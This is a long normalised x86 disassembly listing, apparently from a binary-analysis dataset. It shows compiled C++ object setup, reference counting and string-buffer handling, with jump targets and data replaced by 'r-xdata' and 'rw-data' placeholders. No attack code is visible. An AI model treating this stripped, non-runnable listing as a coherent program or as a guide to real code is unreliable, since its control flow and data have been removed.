lea ecx [ ebp - 0xd4 ]
mov [ ebx + 0x10 ] 0x180
mov edx [ esi + 0x2c ]
push edx
push ecx
call sub_4b2ee4
inc [ ebx + 0x1c ]
inc [ ebx + 0x1c ]
lea eax [ ebp - 0xd4 ]
mov [ ebp - 0x3cc ] eax
xor edx edx
mov [ ebx + 0x10 ] 0x18c
mov [ ebp - 0xd8 ] edx
add esp 0x8
cmp [ ebp - 0xd8 ] 0x1
je r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_4c3b24
pop ecx
cmp [ ebp - 0x2c ] 0x3
jne r-xdata
mov eax [ ebp - 0x10 ]
mov [ eax + 0x3c ] ecx
mov [ ebx + 0x10 ] 0x9c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
add edx 0xc
mov [ eax + 0x14 ] edx
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
add edx 0x10
mov [ ecx + 0x18 ] edx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
add eax 0x1c
mov [ edx + 0x24 ] eax
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x10 ]
add ecx 0x20
mov [ eax + 0x28 ] ecx
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
add edx 0x2c
mov [ ecx + 0x34 ] edx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
add eax 0x30
mov [ edx + 0x38 ] eax
xor edx edx
mov ecx [ ebp - 0x10 ]
mov eax [ ecx + 0x18 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x10 ]
mov eax [ ecx + 0x28 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x10 ]
mov eax [ ecx + 0x38 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x10 ]
mov eax [ ecx + 0x14 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x10 ]
mov eax [ ecx + 0x24 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x10 ]
mov eax [ ecx + 0x34 ]
mov ecx rw-data
mov [ eax ] edx
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x10 ]
mov [ eax ] ecx
push 0x0
push rw-data
mov edx [ ebp - 0x10 ]
push edx
call sub_4b64e8
add esp 0xc
dec [ ebx + 0x1c ]
mov [ ebx + 0x10 ] 0x84
push rw-data
push 0x48
call sub_415614
add esp 0x8
mov [ ebp - 0x178 ] eax
test eax eax
je r-xdata
mov [ ebx + 0x10 ] 0x204
mov edx rw-data
mov ecx [ ebp - 0x170 ]
mov [ ecx ] edx
push 0x10
call sub_4bbbac
pop ecx
mov [ ebp - 0x174 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0xd8 ]
push ecx
call sub_4c3b24
pop ecx
cmp [ ebp - 0xd8 ] 0x3
jne r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x308 ] eax
mov edx [ ebp - 0x308 ]
push edx
mov ecx [ ebp - 0x300 ]
push ecx
call sub_4b9c80
add esp 0x8
mov [ ebp - 0x30c ] eax
cmp [ ebp - 0x30c ] 0x0
jne r-xdata
mov [ ebx + 0x10 ] 0x108
xor ecx ecx
mov [ ebp - 0x34 ] ecx
cmp [ ebp - 0x34 ] 0x1
je r-xdata
inc [ ebx + 0x1c ]
cmp [ rw-data ] 0x0
mov edx [ rw-data ]
mov [ ebp - 0x304 ] edx
jne r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x56c ] eax
mov edx [ ebp - 0x56c ]
mov ecx [ edx + 0x34 ]
mov [ ebp - 0x570 ] ecx
mov eax [ ebp - 0x56c ]
mov [ eax + 0x34 ] rw-data
mov edx [ rw-data ]
mov [ ebp - 0x574 ] edx
mov ecx [ ebp - 0x574 ]
mov eax [ ecx + 0x18 ]
mov [ ebp - 0x578 ] eax
mov edx [ ebp - 0x574 ]
or [ edx + 0x18 ] 0x2000
push rw-data
push 0x48
call sub_415614
add esp 0x8
mov [ ebp - 0x224 ] eax
test eax eax
je r-xdata
mov [ ebx + 0x10 ] 0x24c
mov ecx [ ebp - 0x178 ]
mov edx [ ebp - 0x178 ]
add edx 0x8
mov [ ecx ] edx
mov edx rw-data
mov eax [ ebp - 0x178 ]
add eax 0x8
mov [ ebp - 0x498 ] eax
mov eax rw-data
mov ecx [ ebp - 0x498 ]
mov [ ecx + 0x8 ] edx
mov ecx rw-data
inc [ ebx + 0x1c ]
mov edx [ ebp - 0x498 ]
mov [ edx + 0x8 ] eax
mov edx rw-data
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x178 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x178 ]
mov eax [ ecx ]
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x178 ]
mov ecx [ edx ]
mov [ ebp - 0x49c ] ecx
mov eax [ ebp - 0x49c ]
push eax
call sub_4b3158
pop ecx
mov edx [ ebp - 0x49c ]
mov [ edx + 0x30 ] rw-data
mov ecx [ ebp - 0x49c ]
xor eax eax
mov [ ecx + 0x34 ] eax
mov [ ebx + 0x10 ] 0x258
mov edx [ ebp - 0x49c ]
mov ecx [ edx + 0x2c ]
push ecx
lea eax [ ebp - 0x188 ]
push eax
call sub_4b2ee4
inc [ ebx + 0x1c ]
inc [ ebx + 0x1c ]
lea edx [ ebp - 0x188 ]
mov [ ebp - 0x4a4 ] edx
xor ecx ecx
mov [ ebx + 0x10 ] 0x264
mov [ ebp - 0x18c ] ecx
add esp 0x8
cmp [ ebp - 0x18c ] 0x1
je r-xdata
mov ecx [ ebp - 0x174 ]
mov [ ebx + 0x10 ] 0x228
mov edx [ ebp - 0x174 ]
push edx
call sub_4b9c3c
pop ecx
mov [ ebx + 0x10 ] 0x210
mov ecx [ ebp - 0x174 ]
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x3d4 ] ecx
mov eax [ ebp - 0x3d4 ]
push eax
mov edx [ ebp - 0x3cc ]
push edx
call sub_4b9c80
add esp 0x8
mov [ ebp - 0x3d8 ] eax
cmp [ ebp - 0x3d8 ] 0x0
jne r-xdata
mov [ ebx + 0x10 ] 0x198
xor edx edx
mov [ ebp - 0xe0 ] edx
cmp [ ebp - 0xe0 ] 0x1
je r-xdata
inc [ ebx + 0x1c ]
cmp [ rw-data ] 0x0
mov eax [ rw-data ]
mov [ ebp - 0x3d0 ] eax
jne r-xdata
mov eax [ ebp - 0x30c ]
push eax
dec [ ebx + 0x1c ]
cmp [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x304 ] 0x0
je r-xdata
mov eax [ ebp - 0x34 ]
push eax
call sub_4c3b24
pop ecx
cmp [ ebp - 0x34 ] 0x3
jne r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x650 ] eax
mov edx [ ebp - 0x650 ]
mov ecx [ edx + 0x34 ]
mov [ ebp - 0x654 ] ecx
mov eax [ ebp - 0x650 ]
mov [ eax + 0x34 ] rw-data
mov [ ebx + 0x10 ] 0x2dc
mov ecx [ ebp - 0x224 ]
mov edx [ ebp - 0x224 ]
add edx 0x8
mov [ ecx ] edx
mov edx rw-data
mov eax [ ebp - 0x224 ]
add eax 0x8
mov [ ebp - 0x57c ] eax
mov eax rw-data
mov ecx [ ebp - 0x57c ]
mov [ ecx + 0x8 ] edx
mov ecx rw-data
inc [ ebx + 0x1c ]
mov edx [ ebp - 0x57c ]
mov [ edx + 0x8 ] eax
mov edx rw-data
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x224 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x224 ]
mov eax [ ecx ]
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x224 ]
mov ecx [ edx ]
mov [ ebp - 0x580 ] ecx
mov eax [ ebp - 0x580 ]
push eax
call sub_4b3158
pop ecx
mov edx [ ebp - 0x580 ]
mov [ edx + 0x30 ] rw-data
mov ecx [ ebp - 0x580 ]
xor eax eax
mov [ ecx + 0x34 ] eax
mov [ ebx + 0x10 ] 0x2e8
mov edx [ ebp - 0x580 ]
mov ecx [ edx + 0x2c ]
push ecx
lea eax [ ebp - 0x234 ]
push eax
call sub_4b2ee4
inc [ ebx + 0x1c ]
inc [ ebx + 0x1c ]
lea edx [ ebp - 0x234 ]
mov [ ebp - 0x588 ] edx
xor ecx ecx
mov [ ebx + 0x10 ] 0x2f4
mov [ ebp - 0x238 ] ecx
add esp 0x8
cmp [ ebp - 0x238 ] 0x1
je r-xdata
mov eax [ ebp - 0x18c ]
push eax
call sub_4c3b24
pop ecx
cmp [ ebp - 0x18c ] 0x3
jne r-xdata
mov eax [ ebp - 0x170 ]
mov [ eax + 0x3c ] ecx
mov [ ebx + 0x10 ] 0x204
mov eax [ ebp - 0x170 ]
mov edx [ ebp - 0x170 ]
add edx 0xc
mov [ eax + 0x14 ] edx
mov ecx [ ebp - 0x170 ]
mov edx [ ebp - 0x170 ]
add edx 0x10
mov [ ecx + 0x18 ] edx
mov edx [ ebp - 0x170 ]
mov eax [ ebp - 0x170 ]
add eax 0x1c
mov [ edx + 0x24 ] eax
mov eax [ ebp - 0x170 ]
mov ecx [ ebp - 0x170 ]
add ecx 0x20
mov [ eax + 0x28 ] ecx
mov ecx [ ebp - 0x170 ]
mov edx [ ebp - 0x170 ]
add edx 0x2c
mov [ ecx + 0x34 ] edx
mov edx [ ebp - 0x170 ]
mov eax [ ebp - 0x170 ]
add eax 0x30
mov [ edx + 0x38 ] eax
xor edx edx
mov ecx [ ebp - 0x170 ]
mov eax [ ecx + 0x18 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x170 ]
mov eax [ ecx + 0x28 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x170 ]
mov eax [ ecx + 0x38 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x170 ]
mov eax [ ecx + 0x14 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x170 ]
mov eax [ ecx + 0x24 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x170 ]
mov eax [ ecx + 0x34 ]
mov ecx rw-data
mov [ eax ] edx
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x170 ]
mov [ eax ] ecx
push 0x0
push rw-data
mov edx [ ebp - 0x170 ]
push edx
call sub_4b64e8
add esp 0xc
dec [ ebx + 0x1c ]
mov [ ebx + 0x10 ] 0x1ec
mov eax [ ebp - 0x3d8 ]
push eax
dec [ ebx + 0x1c ]
cmp [ ebp - 0xd8 ] 0x1
je r-xdata
cmp [ ebp - 0x3d0 ] 0x0
je r-xdata
mov ecx [ ebp - 0xe0 ]
push ecx
call sub_4c3b24
pop ecx
cmp [ ebp - 0xe0 ] 0x3
jne r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_4c3b58
pop ecx
cmp [ ebp - 0x2c ] 0x3
jne r-xdata
lea edx [ ebp - 0x304 ]
test edx edx
je r-xdata
mov eax [ ebp - 0x304 ]
mov [ ebp - 0x30c ] eax
jmp r-xdata
dec [ ebx + 0x1c ]
cmp [ ebp - 0x34 ] 0x1
je r-xdata
inc [ rw-data ]
mov edx [ rw-data ]
mov [ rw-data ] edx
inc [ ebx + 0x1c ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp - 0x238 ]
push eax
call sub_4c3b24
pop ecx
cmp [ ebp - 0x238 ] 0x3
jne r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4ac ] eax
mov edx [ ebp - 0x4ac ]
push edx
mov ecx [ ebp - 0x4a4 ]
push ecx
call sub_4b9c80
add esp 0x8
mov [ ebp - 0x4b0 ] eax
cmp [ ebp - 0x4b0 ] 0x0
jne r-xdata
mov [ ebx + 0x10 ] 0x270
xor ecx ecx
mov [ ebp - 0x194 ] ecx
cmp [ ebp - 0x194 ] 0x1
je r-xdata
inc [ ebx + 0x1c ]
cmp [ rw-data ] 0x0
mov edx [ rw-data ]
mov [ ebp - 0x4a8 ] edx
jne r-xdata
mov edx [ ebp - 0xd8 ]
push edx
call sub_4c3b58
pop ecx
cmp [ ebp - 0xd8 ] 0x3
jne r-xdata
lea eax [ ebp - 0x3d0 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x3d0 ]
mov [ ebp - 0x3d8 ] ecx
jmp r-xdata
dec [ ebx + 0x1c ]
cmp [ ebp - 0xe0 ] 0x1
je r-xdata
inc [ rw-data ]
mov eax [ rw-data ]
mov [ rw-data ] eax
inc [ ebx + 0x1c ]
cmp [ rw-data ] 0x0
jne r-xdata
push esi
call sub_4b30b8
pop ecx
add [ ebx + 0x1c ] 0xfffffffe
mov [ ebx + 0x10 ] 0xcc
mov edx [ esi + 0x10 ]
or edx 0x4
mov [ ebp - 0x3c0 ] edx
push 0x0
cmp [ esi + 0x30 ] 0x0
jne r-xdata
pop ecx
mov [ ebx + 0x10 ] 0xf0
mov [ ebp - 0x2fc ] ecx
push 0x20
mov eax [ ebp - 0x2fc ]
push eax
mov edx [ eax ]
call [ edx + 0x14 ]
add esp 0x8
lea ecx [ ebp - 0x28 ]
push eax
dec [ ebx + 0x1c ]
push 0x2
push ecx
call sub_4b2f24
add esp 0x8
pop eax
mov [ ebx + 0x10 ] 0xe4
mov [ esi + 0x38 ] al
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax 0x1
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp - 0x304 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x34 ]
push ecx
call sub_4c3b58
pop ecx
cmp [ ebp - 0x34 ] 0x3
jne r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x590 ] eax
mov edx [ ebp - 0x590 ]
push edx
mov ecx [ ebp - 0x588 ]
push ecx
call sub_4b9c80
add esp 0x8
mov [ ebp - 0x594 ] eax
cmp [ ebp - 0x594 ] 0x0
jne r-xdata
mov [ ebx + 0x10 ] 0x300
xor ecx ecx
mov [ ebp - 0x240 ] ecx
cmp [ ebp - 0x240 ] 0x1
je r-xdata
inc [ ebx + 0x1c ]
cmp [ rw-data ] 0x0
mov edx [ rw-data ]
mov [ ebp - 0x58c ] edx
jne r-xdata
mov eax [ ebp - 0x4b0 ]
push eax
dec [ ebx + 0x1c ]
cmp [ ebp - 0x18c ] 0x1
je r-xdata
cmp [ ebp - 0x4a8 ] 0x0
je r-xdata
mov eax [ ebp - 0x194 ]
push eax
call sub_4c3b24
pop ecx
cmp [ ebp - 0x194 ] 0x3
jne r-xdata
push esi
call sub_4b30b8
pop ecx
add [ ebx + 0x1c ] 0xfffffffe
mov [ ebx + 0x10 ] 0x15c
mov edx [ esi + 0x10 ]
or edx 0x4
mov [ ebp - 0x48c ] edx
push 0x0
cmp [ esi + 0x30 ] 0x0
jne r-xdata
pop ecx
mov [ ebx + 0x10 ] 0x180
mov [ ebp - 0x3c8 ] ecx
push 0x20
mov eax [ ebp - 0x3c8 ]
push eax
mov edx [ eax ]
call [ edx + 0x14 ]
add esp 0x8
lea ecx [ ebp - 0xd4 ]
push eax
dec [ ebx + 0x1c ]
push 0x2
push ecx
call sub_4b2f24
add esp 0x8
pop eax
mov [ ebx + 0x10 ] 0x174
mov [ esi + 0x38 ] al
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax 0x1
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp - 0x3d0 ] 0x0
jne r-xdata
mov edx [ ebp - 0xe0 ]
push edx
call sub_4c3b58
pop ecx
cmp [ ebp - 0xe0 ] 0x3
jne r-xdata
mov ecx [ ebp - 0x3c0 ]
mov ecx [ ebp - 0x3c0 ]
or ecx 0x4
jmp r-xdata
mov edx [ ebp - 0x304 ]
mov [ ebp - 0x30c ] edx
mov ecx [ ebp - 0x304 ]
mov eax [ ebp - 0x304 ]
mov [ ebp - 0x3bc ] eax
mov [ rw-data ] ecx
mov edx [ ebp - 0x3bc ]
add edx 0x4
push edx
call sub_4c3b78
pop ecx
mov ecx [ ebp - 0x3bc ]
push ecx
call sub_4ba37c
pop ecx
push ebx
push 0x0
push 0x0
push 0x0
push 0x1
push r-xdata
push 0x0
lea edx [ ebp - 0x30 ]
push edx
call sub_4088ac
pop ecx
lea eax [ ebp - 0x30 ]
inc [ ebx + 0x1c ]
mov ecx rw-data
mov [ ebp - 0x30 ] ecx
inc [ ebx + 0x1c ]
push eax
push r-xdata
call sub_4d1c20
add esp 0x24
jmp r-xdata
push 0x18
call sub_4bbbac
pop ecx
mov [ ebp - 0x38 ] eax
test eax eax
je r-xdata
mov [ ebx + 0x10 ] 0xfc
mov eax [ ebp - 0x594 ]
push eax
dec [ ebx + 0x1c ]
cmp [ ebp - 0x238 ] 0x1
je r-xdata
cmp [ ebp - 0x58c ] 0x0
je r-xdata
mov eax [ ebp - 0x240 ]
push eax
call sub_4c3b24
pop ecx
cmp [ ebp - 0x240 ] 0x3
jne r-xdata
mov edx [ ebp - 0x18c ]
push edx
call sub_4c3b58
pop ecx
cmp [ ebp - 0x18c ] 0x3
jne r-xdata
lea edx [ ebp - 0x4a8 ]
test edx edx
je r-xdata
mov eax [ ebp - 0x4a8 ]
mov [ ebp - 0x4b0 ] eax
jmp r-xdata
dec [ ebx + 0x1c ]
cmp [ ebp - 0x194 ] 0x1
je r-xdata
inc [ rw-data ]
mov edx [ rw-data ]
mov [ rw-data ] edx
inc [ ebx + 0x1c ]
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ ebp - 0x48c ]
mov ecx [ ebp - 0x48c ]
or ecx 0x4
jmp r-xdata
mov edx [ ebp - 0x3d0 ]
mov [ ebp - 0x3d8 ] edx
mov ecx [ ebp - 0x3d0 ]
mov eax [ ebp - 0x3d0 ]
mov [ ebp - 0x488 ] eax
mov [ rw-data ] ecx
mov edx [ ebp - 0x488 ]
add edx 0x4
push edx
call sub_4c3b78
pop ecx
mov ecx [ ebp - 0x488 ]
push ecx
call sub_4ba37c
pop ecx
push ebx
push 0x0
push 0x0
push 0x0
push 0x1
push r-xdata
push 0x0
lea edx [ ebp - 0xdc ]
push edx
call sub_4088ac
pop ecx
lea eax [ ebp - 0xdc ]
inc [ ebx + 0x1c ]
mov ecx rw-data
mov [ ebp - 0xdc ] ecx
inc [ ebx + 0x1c ]
push eax
push r-xdata
call sub_4d1c20
add esp 0x24
jmp r-xdata
push 0x18
call sub_4bbbac
pop ecx
mov [ ebp - 0xe4 ] eax
test eax eax
je r-xdata
mov [ ebx + 0x10 ] 0x18c
push ecx
push esi
call sub_4b02b0
add esp 0xc
mov eax [ ebp - 0x38 ]
mov [ ebx + 0x10 ] 0x138
mov edx [ ebp - 0x300 ]
mov ecx [ edx + 0x8 ]
add ecx 0x18
mov [ ebp - 0x314 ] ecx
mov eax [ ebp - 0x314 ]
add eax 0x8
push eax
lea edx [ ebp - 0x31c ]
push edx
call sub_408650
add esp 0x8
lea ecx [ ebp - 0x31c ]
push ecx
lea eax [ ebp - 0x58 ]
push eax
call sub_408650
add esp 0x8
mov edx 0xf
mov [ ebp - 0x3c ] edx
mov [ ebp - 0x31d ] 0x0
cmp [ ebp - 0x3c ] 0x10
jb r-xdata
mov edx [ ebp - 0x238 ]
push edx
call sub_4c3b58
pop ecx
cmp [ ebp - 0x238 ] 0x3
jne r-xdata
lea edx [ ebp - 0x58c ]
test edx edx
je r-xdata
mov eax [ ebp - 0x58c ]
mov [ ebp - 0x594 ] eax
jmp r-xdata
dec [ ebx + 0x1c ]
cmp [ ebp - 0x240 ] 0x1
je r-xdata
inc [ rw-data ]
mov edx [ rw-data ]
mov [ rw-data ] edx
inc [ ebx + 0x1c ]
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ ebp - 0x49c ]
push ecx
call sub_4b30b8
pop ecx
add [ ebx + 0x1c ] 0xfffffffe
mov [ ebx + 0x10 ] 0x234
mov eax [ ebp - 0x49c ]
mov edx [ eax + 0x10 ]
or edx 0x4
mov [ ebp - 0x568 ] edx
push 0x0
mov ecx [ ebp - 0x49c ]
cmp [ ecx + 0x30 ] 0x0
jne r-xdata
pop ecx
mov [ ebx + 0x10 ] 0x258
mov [ ebp - 0x4a0 ] ecx
push 0x20
mov eax [ ebp - 0x4a0 ]
push eax
mov edx [ eax ]
call [ edx + 0x14 ]
add esp 0x8
lea ecx [ ebp - 0x188 ]
push eax
dec [ ebx + 0x1c ]
push 0x2
push ecx
call sub_4b2f24
add esp 0x8
pop eax
mov [ ebx + 0x10 ] 0x24c
mov edx [ ebp - 0x49c ]
mov [ edx + 0x38 ] al
mov ecx [ ebp - 0x49c ]
cmp [ ecx + 0x30 ] 0x0
jne r-xdata
mov eax 0x1
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp - 0x4a8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x194 ]
push ecx
call sub_4c3b58
pop ecx
cmp [ ebp - 0x194 ] 0x3
jne r-xdata
push ecx
push esi
call sub_4b02b0
add esp 0xc
mov eax [ ebp - 0xe4 ]
mov [ ebx + 0x10 ] 0x1c8
mov edx [ ebp - 0x3cc ]
mov ecx [ edx + 0x8 ]
add ecx 0x18
mov [ ebp - 0x3e0 ] ecx
mov eax [ ebp - 0x3e0 ]
add eax 0x8
push eax
lea edx [ ebp - 0x3e8 ]
push edx
call sub_408650
add esp 0x8
lea ecx [ ebp - 0x3e8 ]
push ecx
lea eax [ ebp - 0x104 ]
push eax
call sub_408650
add esp 0x8
mov edx 0xf
mov [ ebp - 0xe8 ] edx
mov [ ebp - 0x3e9 ] 0x0
cmp [ ebp - 0xe8 ] 0x10
jb r-xdata
mov ecx 0xf
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x3b1 ] 0x0
cmp [ ebp - 0x3c ] 0x10
jb r-xdata
mov ecx [ ebp - 0x50 ]
mov [ ebp - 0x3ac ] ecx
mov eax [ ebp - 0x3ac ]
mov [ ebp - 0x3b0 ] eax
mov edx [ ebp - 0x3b0 ]
push edx
call sub_4b0180
pop ecx
lea ecx [ ebp - 0x50 ]
mov ecx [ ebp - 0x50 ]
jmp r-xdata
mov ecx [ ebp - 0x580 ]
push ecx
call sub_4b30b8
pop ecx
add [ ebx + 0x1c ] 0xfffffffe
mov [ ebx + 0x10 ] 0x2c4
mov eax [ ebp - 0x580 ]
mov edx [ eax + 0x10 ]
or edx 0x4
mov [ ebp - 0x64c ] edx
push 0x0
mov ecx [ ebp - 0x580 ]
cmp [ ecx + 0x30 ] 0x0
jne r-xdata
pop ecx
mov [ ebx + 0x10 ] 0x2e8
mov [ ebp - 0x584 ] ecx
push 0x20
mov eax [ ebp - 0x584 ]
push eax
mov edx [ eax ]
call [ edx + 0x14 ]
add esp 0x8
lea ecx [ ebp - 0x234 ]
push eax
dec [ ebx + 0x1c ]
push 0x2
push ecx
call sub_4b2f24
add esp 0x8
pop eax
mov [ ebx + 0x10 ] 0x2dc
mov edx [ ebp - 0x580 ]
mov [ edx + 0x38 ] al
mov ecx [ ebp - 0x580 ]
cmp [ ecx + 0x30 ] 0x0
jne r-xdata
mov eax 0x1
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp - 0x58c ] 0x0
jne r-xdata
mov ecx [ ebp - 0x240 ]
push ecx
call sub_4c3b58
pop ecx
cmp [ ebp - 0x240 ] 0x3
jne r-xdata
mov eax [ ebp - 0x568 ]
mov eax [ ebp - 0x568 ]
or eax 0x4
jmp r-xdata
mov edx [ ebp - 0x4a8 ]
mov [ ebp - 0x4b0 ] edx
mov ecx [ ebp - 0x4a8 ]
mov eax [ ebp - 0x4a8 ]
mov [ ebp - 0x564 ] eax
mov [ rw-data ] ecx
mov edx [ ebp - 0x564 ]
add edx 0x4
push edx
call sub_4c3b78
pop ecx
mov ecx [ ebp - 0x564 ]
push ecx
call sub_4ba37c
pop ecx
push ebx
push 0x0
push 0x0
push 0x0
push 0x1
push r-xdata
push 0x0
lea edx [ ebp - 0x190 ]
push edx
call sub_4088ac
pop ecx
lea eax [ ebp - 0x190 ]
inc [ ebx + 0x1c ]
mov ecx rw-data
mov [ ebp - 0x190 ] ecx
inc [ ebx + 0x1c ]
push eax
push r-xdata
call sub_4d1c20
add esp 0x24
jmp r-xdata
push 0x18
call sub_4bbbac
pop ecx
mov [ ebp - 0x198 ] eax
test eax eax
je r-xdata
mov [ ebx + 0x10 ] 0x264
mov ecx 0xf
mov [ ebp - 0xe8 ] ecx
mov [ ebp - 0x47d ] 0x0
cmp [ ebp - 0xe8 ] 0x10
jb r-xdata
mov ecx [ ebp - 0xfc ]
mov [ ebp - 0x478 ] ecx
mov eax [ ebp - 0x478 ]
mov [ ebp - 0x47c ] eax
mov edx [ ebp - 0x47c ]
push edx
call sub_4b0180
pop ecx
lea ecx [ ebp - 0xfc ]
mov ecx [ ebp - 0xfc ]
jmp r-xdata
lea eax [ ebp - 0x50 ]
mov eax [ ebp - 0x50 ]
jmp r-xdata
mov ecx [ ebp - 0x314 ]
mov eax [ ecx + 0x20 ]
mov [ ebp - 0x328 ] eax
cmp [ ebp - 0x328 ] 0xffffffff
jbe r-xdata
lea edx [ ebp - 0x60 ]
push edx
call sub_4bc8cc
pop ecx
xor eax eax
mov [ ebp - 0x40 ] eax
add ecx eax
mov [ ebp - 0x324 ] ecx
mov edx [ ebp - 0x324 ]
mov cl [ ebp - 0x31d ]
mov [ edx ] cl
mov eax [ ebp - 0x314 ]
cmp [ eax + 0x20 ] 0x0
jae r-xdata
mov eax [ ebp - 0x64c ]
mov eax [ ebp - 0x64c ]
or eax 0x4
jmp r-xdata
mov edx [ ebp - 0x58c ]
mov [ ebp - 0x594 ] edx
mov ecx [ ebp - 0x58c ]
mov eax [ ebp - 0x58c ]
mov [ ebp - 0x648 ] eax
mov [ rw-data ] ecx
mov edx [ ebp - 0x648 ]
add edx 0x4
push edx
call sub_4c3b78
pop ecx
mov ecx [ ebp - 0x648 ]
push ecx
call sub_4ba37c
pop ecx
push ebx
push 0x0
push 0x0
push 0x0
push 0x1
push r-xdata
push 0x0
lea edx [ ebp - 0x23c ]
push edx
call sub_4088ac
pop ecx
lea eax [ ebp - 0x23c ]
inc [ ebx + 0x1c ]
mov ecx rw-data
mov [ ebp - 0x23c ] ecx
inc [ ebx + 0x1c ]
push eax
push r-xdata
call sub_4d1c20
add esp 0x24
jmp r-xdata
push 0x18
call sub_4bbbac
pop ecx
mov [ ebp - 0x244 ] eax
test eax eax
je r-xdata
mov [ ebx + 0x10 ] 0x2f4
push eax
mov edx [ ebp - 0x49c ]
push edx
call sub_4b02b0
add esp 0xc
mov eax [ ebp - 0x198 ]
mov [ ebx + 0x10 ] 0x2a0
mov edx [ ebp - 0x4a4 ]
mov ecx [ edx + 0x8 ]
add ecx 0x18
mov [ ebp - 0x4b8 ] ecx
mov eax [ ebp - 0x4b8 ]
add eax 0x8
push eax
lea edx [ ebp - 0x4c0 ]
push edx
call sub_408650
add esp 0x8
lea ecx [ ebp - 0x4c0 ]
push ecx
lea eax [ ebp - 0x1b8 ]
push eax
call sub_408650
add esp 0x8
mov edx 0xf
mov [ ebp - 0x19c ] edx
mov [ ebp - 0x4c1 ] 0x0
cmp [ ebp - 0x19c ] 0x10
jb r-xdata
lea eax [ ebp - 0xfc ]
mov eax [ ebp - 0xfc ]
jmp r-xdata
mov ecx [ ebp - 0x3e0 ]
mov eax [ ecx + 0x20 ]
mov [ ebp - 0x3f4 ] eax
cmp [ ebp - 0x3f4 ] 0xffffffff
jbe r-xdata
lea edx [ ebp - 0x10c ]
push edx
call sub_4bc8cc
pop ecx
xor eax eax
mov [ ebp - 0xec ] eax
add ecx eax
mov [ ebp - 0x3f0 ] ecx
mov edx [ ebp - 0x3f0 ]
mov cl [ ebp - 0x3e9 ]
mov [ edx ] cl
mov eax [ ebp - 0x3e0 ]
cmp [ eax + 0x20 ] 0x0
jae r-xdata
xor edx edx
mov [ ebp - 0x40 ] edx
add eax edx
mov [ ebp - 0x3b8 ] eax
mov eax [ ebp - 0x3b8 ]
mov cl [ ebp - 0x3b1 ]
mov [ eax ] cl
mov [ ebx + 0x10 ] 0xfc
lea edx [ ebp - 0x60 ]
cmp edx [ ebp - 0x314 ]
jne r-xdata
mov [ ebp - 0x328 ] 0xffffffff
push eax
mov edx [ ebp - 0x580 ]
push edx
call sub_4b02b0
add esp 0xc
mov eax [ ebp - 0x244 ]
mov [ ebx + 0x10 ] 0x330
mov edx [ ebp - 0x588 ]
mov ecx [ edx + 0x8 ]
add ecx 0x18
mov [ ebp - 0x59c ] ecx
mov eax [ ebp - 0x59c ]
add eax 0x8
push eax
lea edx [ ebp - 0x5a4 ]
push edx
call sub_408650
add esp 0x8
lea ecx [ ebp - 0x5a4 ]
push ecx
lea eax [ ebp - 0x264 ]
push eax
call sub_408650
add esp 0x8
mov edx 0xf
mov [ ebp - 0x248 ] edx
mov [ ebp - 0x5a5 ] 0x0
cmp [ ebp - 0x248 ] 0x10
jb r-xdata
mov ecx 0xf
mov [ ebp - 0x19c ] ecx
mov [ ebp - 0x559 ] 0x0
cmp [ ebp - 0x19c ] 0x10
jb r-xdata
mov ecx [ ebp - 0x1b0 ]
mov [ ebp - 0x554 ] ecx
mov eax [ ebp - 0x554 ]
mov [ ebp - 0x558 ] eax
mov edx [ ebp - 0x558 ]
push edx
call sub_4b0180
pop ecx
lea ecx [ ebp - 0x1b0 ]
mov ecx [ ebp - 0x1b0 ]
jmp r-xdata
xor edx edx
mov [ ebp - 0xec ] edx
add eax edx
mov [ ebp - 0x484 ] eax
mov eax [ ebp - 0x484 ]
mov cl [ ebp - 0x47d ]
mov [ eax ] cl
mov [ ebx + 0x10 ] 0x18c
lea edx [ ebp - 0x10c ]
cmp edx [ ebp - 0x3e0 ]
jne r-xdata
mov [ ebp - 0x3f4 ] 0xffffffff
mov edi [ ebp - 0x328 ]
